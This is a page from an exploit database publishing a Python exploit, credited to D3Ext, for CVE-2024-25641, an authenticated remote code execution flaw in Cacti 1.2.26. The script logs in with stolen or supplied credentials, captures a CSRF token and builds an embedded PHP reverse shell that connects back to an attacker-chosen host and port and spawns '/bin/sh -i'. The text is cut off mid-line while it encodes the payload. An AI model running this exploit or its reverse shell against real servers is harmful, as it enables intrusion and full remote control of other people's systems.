---
title: Cacti 1.2.26  Remote Code Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2025040020
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-16
fetch_date: 2025-10-06T22:03:56.694218
---

# Cacti 1.2.26  Remote Code Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Cacti 1.2.26 Remote Code Execution (RCE)** **2025.04.15**  Credit:  **[D3Ext](https://cxsecurity.com/author/D3Ext/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-25641](https://cxsecurity.com/cveshow/CVE-2024-25641/ "Click to see CVE-2024-25641")**  CWE: **N/A** | |

# Exploit Title: Cacti 1.2.26 - Remote Code Execution (RCE) (Authenticated)
# Date: 06/01/2025
# Exploit Author: D3Ext
# Vendor Homepage: https://cacti.net/
# Software Link: https://github.com/Cacti/cacti/archive/refs/tags/release/1.2.26.zip
# Version: 1.2.26
# Tested on: Kali Linux 2024
# CVE: CVE-2024-25641
#!/usr/bin/python3
import os
import requests
import base64
import gzip
import time
import argparse
import string
import random
from bs4 import BeautifulSoup
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives import serialization
def get\_random\_string(length):
letters = string.ascii\_lowercase
result\_str = ''.join(random.choice(letters) for i in range(length))
return result\_str
def check\_version(url\_to\_check):
r = requests.get(url\_to\_check)
response = r.text
if "Cacti CHANGELOG" in response and "1.2.26" in response and "1.2.27" not in response:
print("[+] Version seems to be 1.2.26")
else:
print("[-] Version doesn't seem to be 1.2.26, proceeding anyway")
# Main function
if \_\_name\_\_ == '\_\_main\_\_':
p = argparse.ArgumentParser(description="CVE-2024-25641 - Cacti 1.2.26 Authenticated RCE")
p.add\_argument('--url', help="URL of the Cacti web root", required=True)
p.add\_argument('--user', help="username to log in", required=True)
p.add\_argument('--password', help="password of the username", required=True)
p.add\_argument('--lhost', help="local host to receive the reverse shell", required=True)
p.add\_argument('--lport', help="local port to receive the reverse shell", required=True)
p.add\_argument('--verbose', help="enable verbose", action='store\_true', default=False, required=False)
# Parse CLI arguments
parser = p.parse\_args()
url = parser.url
username = parser.user
password = parser.password
lhost = parser.lhost
lport = parser.lport
verbose = parser.verbose
url = url.rstrip("/")
print("CVE-2024-25641 - Cacti 1.2.26 Authenticated RCE\n")
# check if versions match
print("[\*] Checking Cacti version...")
time.sleep(0.5)
check = check\_version(url + "/CHANGELOG")
if check == False:
sys.exit(0)
req = requests.Session()
if verbose:
print("[\*] Capturing CSRF token...")
r = req.get(url)
# extract CSRF token
soup = BeautifulSoup(r.text, 'html.parser')
html\_parser = soup.find('input', {'name': '\_\_csrf\_magic'})
csrf\_token = html\_parser.get('value')
if verbose:
print("[+] CSRF token: " + csrf\_token)
print("[\*] Logging in on " + url + "/index.php")
# define login post data
login\_data = {
'\_\_csrf\_magic': csrf\_token,
'action': 'login',
'login\_username': username,
'login\_password': password,
'remember\_me': 'on'
}
# send login request
r = req.post(url + "/index.php", data=login\_data)
# check success
if 'Logged in' in r.text:
print("[+] Successfully logged in as " + username)
else:
print("[-] An error has ocurred while logging in as " + username)
sys.exit(0)
# generate random filename
random\_name = get\_random\_string(10)
random\_filename = random\_name + ".php"
payload = """<?php
set\_time\_limit (0);
$VERSION = "1.0";
$ip = '""" + lhost + """';
$port = """ + lport + """;
$chunk\_size = 1400;
$write\_a = null;
$error\_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function\_exists('pcntl\_fork')) {
$pid = pcntl\_fork();
if ($pid == -1) {
printit("ERROR: Can't fork");
exit(1);
}
if ($pid) {
exit(0); // Parent exits
}
if (posix\_setsid() == -1) {
printit("Error: Can't setsid()");
exit(1);
}
$daemon = 1;
} else {
printit("WARNING: Failed to daemonise. This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
printit("$errstr ($errno)");
exit(1);
}
$descriptorspec = array(
0 => array("pipe", "r"), // stdin is a pipe that the child will read from
1 => array("pipe", "w"), // stdout is a pipe that the child will write to
2 => array("pipe", "w") // stderr is a pipe that the child will write to
);
$process = proc\_open($shell, $descriptorspec, $pipes);
if (!is\_resource($process)) {
printit("ERROR: Can't spawn shell");
exit(1);
}
stream\_set\_blocking($pipes[0], 0);
stream\_set\_blocking($pipes[1], 0);
stream\_set\_blocking($pipes[2], 0);
stream\_set\_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
if (feof($sock)) {
printit("ERROR: Shell connection terminated");
break;
}
if (feof($pipes[1])) {
printit("ERROR: Shell process terminated");
break;
}
$read\_a = array($sock, $pipes[1], $pipes[2]);
$num\_changed\_sockets = stream\_select($read\_a, $write\_a, $error\_a, null);
// If we can read from the TCP socket, send
// data to process's STDIN
if (in\_array($sock, $read\_a)) {
if ($debug) printit("SOCK READ");
$input = fread($sock, $chunk\_size);
if ($debug) printit("SOCK: $input");
fwrite($pipes[0], $input);
}
if (in\_array($pipes[1], $read\_a)) {
if ($debug) printit("STDOUT READ");
$input = fread($pipes[1], $chunk\_size);
if ($debug) printit("STDOUT: $input");
fwrite($sock, $input);
}
if (in\_array($pipes[2], $read\_a)) {
if ($debug) printit("STDERR READ");
$input = fread($pipes[2], $chunk\_size);
if ($debug) printit("STDERR: $input");
fwrite($sock, $input);
}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc\_close($process);
function printit ($string) {
if (!$daemon) {
print "$string\n";
}
}
?>"""
# generate payload
print("[\*] Generating malicious payload...")
keypair = rsa.generate\_private\_key(public\_exponent=65537, key\_size=2048)
public\_key = keypair.public\_key().public\_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)
file\_signature = keypair.sign(payload.encode('utf-8'), padding.PKCS1v15(), hashes.SHA256())
b64\_payload = base64.b64encode(payl...